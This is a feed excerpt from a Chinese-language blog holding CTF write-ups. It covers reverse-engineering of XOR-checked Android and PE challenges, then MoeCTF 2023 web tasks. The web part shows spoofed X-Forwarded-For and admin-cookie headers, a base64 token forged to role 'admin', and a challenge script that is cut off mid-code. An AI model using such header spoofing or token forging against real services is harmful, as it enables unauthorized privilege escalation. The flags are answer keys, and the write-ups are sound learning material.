&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{llittl_Endian_a}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-androxor&quot;&gt;[Week 1]AndroXor&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-androxor&quot; aria-label=&quot;Anchor link for: week-1-androxor&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;apktool.org&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;skylot&#x2F;jadx&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;可以在上述引用中下载 apktool ，下载后使用 apktool 进行逆向&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ apktool d AndroXor.apk
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;逆向后使用 jadx 打开进行 Java 反编译，在 &lt;code&gt;com&#x2F;chick.androxor&#x2F;MainActivity&lt;&#x2F;code&gt; 中存在以下内容&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public String Xor(String str, String str2) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        char[] cArr = {14, &amp;#39;\r&amp;#39;, 17, 23, 2, &amp;#39;K&amp;#39;, &amp;#39;I&amp;#39;, &amp;#39;7&amp;#39;, &amp;#39; &amp;#39;, 30, 20, &amp;#39;I&amp;#39;, &amp;#39;\n&amp;#39;, 2, &amp;#39;\f&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;(&amp;#39;, &amp;#39;@&amp;#39;, 11, &amp;#39;\&amp;#39;&amp;#39;, &amp;#39;K&amp;#39;, &amp;#39;Y&amp;#39;, 25, &amp;#39;A&amp;#39;, &amp;#39;\r&amp;#39;};
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        char[] cArr2 = new char[str.length()];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        String str3 = str.length() != 25 ? &amp;quot;wrong!!!&amp;quot; : &amp;quot;you win!!!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        for (int i = 0; i &amp;lt; str.length(); i++) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length()));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            cArr2[i] = charAt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if (cArr[i] != charAt) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return &amp;quot;wrong!!!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return str3;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	@Override &#x2F;&#x2F; androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public void onCreate(Bundle bundle) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        super.onCreate(bundle);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        this.binding = inflate;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        setContentView(inflate.getRoot());
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        final EditText editText = (EditText) findViewById(R.id.password);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { &#x2F;&#x2F; from class: com.chick.androxor.MainActivity.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            @Override &#x2F;&#x2F; android.view.View.OnClickListener
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            public void onClick(View view) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                String obj = editText.getText().toString();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                MainActivity mainActivity = MainActivity.this;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                Toast.makeText(mainActivity, mainActivity.Xor(obj, &amp;quot;happyx3&amp;quot;), 1).show();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                Log.d(&amp;quot;输入&amp;quot;, editText.getText().toString());
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        });
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可得明文长度为 25，并且代码将循环遍历明文每一个字符，并使用每个字符与第二个参数字符串(happyx3)的对应位置字符进行异或运算，将得到的新字符添加到 cArr2 中，并且还会将cArr2中的字符与cArr中的对应位置字符进行比较。&lt;&#x2F;p&gt;
&lt;p&gt;因此要获得明文需要对应位置逐个异或运算推回来即可，先将 cArr 数字中的其他值都转化为 ascii 值形态，再进行异或运算，将运算结果转回字符即可，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cArr = [14, &amp;#39;\r&amp;#39;, 17, 23, 2, &amp;#39;K&amp;#39;, &amp;#39;I&amp;#39;, &amp;#39;7&amp;#39;, &amp;#39; &amp;#39;, 30, 20, &amp;#39;I&amp;#39;, &amp;#39;\n&amp;#39;, 2, &amp;#39;\f&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;(&amp;#39;, &amp;#39;@&amp;#39;, 11, &amp;#39;\&amp;#39;&amp;#39;, &amp;#39;K&amp;#39;, &amp;#39;Y&amp;#39;, 25, &amp;#39;A&amp;#39;, &amp;#39;\r&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;str = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;str2 = &amp;quot;happyx3&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def convert_to_ord(lst):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(len(lst)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if not isinstance(lst[i], int):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            lst[i] = ord(lst[i])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return lst
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cArr = convert_to_ord(cArr)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(25):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    str += chr(cArr[i] ^ ord(str2[i % len(str2)]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(str)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{3z_And0r1d_X0r_x1x1}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-ezpe&quot;&gt;[Week 1]EzPE&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-ezpe&quot; aria-label=&quot;Anchor link for: week-1-ezpe&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;下载附件后用查壳工具查发现无法查出来，用 010 打开和其他 exe 文件对比发现缺失了文件头部分，需将文件头部分进行修复。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FMEPGebOjUqq8l8DrWOab%252FEzPE-1.png%3Falt%3Dmedia%26token%3D61a87172-da22-4f40-b6a3-8e554f54118d&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=77123c2bab2b6b0abfaa19527042e71919efd1de307ccc5a32f152ec991ad61b&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;用 ida64 打开，通过反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-4h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  _main(argc, argv, envp);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;amp;draw);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Please enter your flag!\n&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  scanf(&amp;quot;%s&amp;quot;, input);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( i = 0; i &amp;lt; strlen(input) - 1; ++i )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    input[i] ^= i ^ input[i + 1];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  if ( !strcmp(input, data) )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;You Win!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  else
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;You lose!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  system(&amp;quot;pause&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;并且 data 数组内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array_data = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可得密文由将明文的每个字符与其下一个字符以及当前 index 值进行异或运算，并将结果赋值给当前字符，因此要逆向回来只需要倒转反过来即可，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array_data = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(len(array_data))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(len(array_data) - 2, 0, -1):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    array_data[i] ^= i ^ array_data[i + 1]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(&amp;#39;&amp;#39;.join(chr(data) for data in array_data))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{Y0u_kn0w_what_1s_PE_File_F0rmat}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-lazy-activtiy&quot;&gt;[Week 1]lazy_activtiy&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-lazy-activtiy&quot; aria-label=&quot;Anchor link for: week-1-lazy-activtiy&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;liaojack8&#x2F;AndroidKiller&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;使用 AndroidKiller 打开后搜索 flag 即可得到 flag。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FZl7WLJOue4Uv9zlfSF1T%252Flazy_activtiy-1.png%3Falt%3Dmedia%26token%3D36498bef-15b7-4f75-a37b-1e899525c9b5&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=7a8856c106556e0aeea2da78dd92d611d36371a3bf0417237ca6d33703e40e46&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{Act1v1ty_!s_so00oo0o_Impor#an#}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#&quot; aria-label=&quot;Anchor link for: &quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>moectf wp</title>
		<published>2023-04-15T00:00:00+00:00</published>
		<updated>2025-06-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/moectf/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/moectf/</id>
		<content type="html">&lt;h1 id=&quot;moectf-2023&quot;&gt;MoeCTF 2023&lt;a class=&quot;zola-anchor&quot; href=&quot;#moectf-2023&quot; aria-label=&quot;Anchor link for: moectf-2023&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;web&quot;&gt;Web&lt;a class=&quot;zola-anchor&quot; href=&quot;#web&quot; aria-label=&quot;Anchor link for: web&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;ru-men-zhi-bei&quot;&gt;入门指北&lt;a class=&quot;zola-anchor&quot; href=&quot;#ru-men-zhi-bei&quot; aria-label=&quot;Anchor link for: ru-men-zhi-bei&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;注意，此部分图床已坏&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;十六进制转字符串可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;再进行一次 base64 解码就可以得到 flag。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{w3lCome_To_moeCTF_W2b_challengE!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;http&quot;&gt;http&lt;a class=&quot;zola-anchor&quot; href=&quot;#http&quot; aria-label=&quot;Anchor link for: http&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Param: UwU=u
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Body: Luv=u
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;X-Forwarded-For: 127.0.0.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Cookie: character=admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;User-Agent: MoeBrowser
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;moectf{basic_http_knowledge_Xcpf6zq45VutatFPmmelppGUvZpFN_yK}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;cookie&quot;&gt;cookie&lt;a class=&quot;zola-anchor&quot; href=&quot;#cookie&quot; aria-label=&quot;Anchor link for: cookie&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;注册 &lt;code&gt;POST &#x2F;register&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;username&amp;quot;:&amp;quot;koito1&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;password&amp;quot;:&amp;quot;123456&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;登录 &lt;code&gt;POST &#x2F;login&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;username&amp;quot;:&amp;quot;koito1&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;password&amp;quot;:&amp;quot;123456&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;获取flag &lt;code&gt;GET &#x2F;flag&lt;&#x2F;code&gt; ，回显没管理员权限，Cookie 存在 Token，将 Token 通过 base64 解码可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;quot;username&amp;quot;: &amp;quot;koito1&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;123456&amp;quot;, &amp;quot;role&amp;quot;: &amp;quot;user&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;修改成以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;quot;username&amp;quot;: &amp;quot;koito1&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;123456&amp;quot;, &amp;quot;role&amp;quot;: &amp;quot;admin&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;并通过 base64 进行编码，并构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Cookie: character=admin; token=eyJ1c2VybmFtZSI6ICJrb2l0bzEiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ==
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可获取 flag &lt;code&gt;moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;bi-an-de-flag&quot;&gt;彼岸的flag&lt;a class=&quot;zola-anchor&quot; href=&quot;#bi-an-de-flag&quot; aria-label=&quot;Anchor link for: bi-an-de-flag&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;打开源代码梭哈。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;gas-gas-gas&quot;&gt;gas!gas!gas!&lt;a class=&quot;zola-anchor&quot; href=&quot;#gas-gas-gas&quot; aria-label=&quot;Anchor link for: gas-gas-gas&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import time
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;session = requests.Session()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;url = &amp;quot;http:&#x2F;&#x2F;localhost:60043&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def car():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    data = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;driver&amp;quot;: &amp;quot;1&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;steering_control&amp;quot;: &amp;quot;0&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;throttle&amp;quot;: &amp;quot;2&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for _ in range(0, 7):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        time.sleep(0.1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ret = session.post(url, data=data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        #print(ret.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;弯道向右&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;steering_control&amp;quot;] = &amp;quot;-1&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;弯道向右&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;弯道直行&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;steering_control&amp;quot;] = &amp;quot;0&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;弯道直行&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;弯道向左&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;steering_control&amp;quot;] = &amp;quot;1&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;弯道向左&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;抓地力太大了！&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;throttle&amp;quot;] = &amp;quot;2&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;抓地力太大了！&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;保持这个速度&amp;quot; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            data[&amp;quot;throttle&amp;quot;] = &amp;quot;1&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;保持这个速度&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;quot;抓地力太小了！&amp;quot; in ret.text:
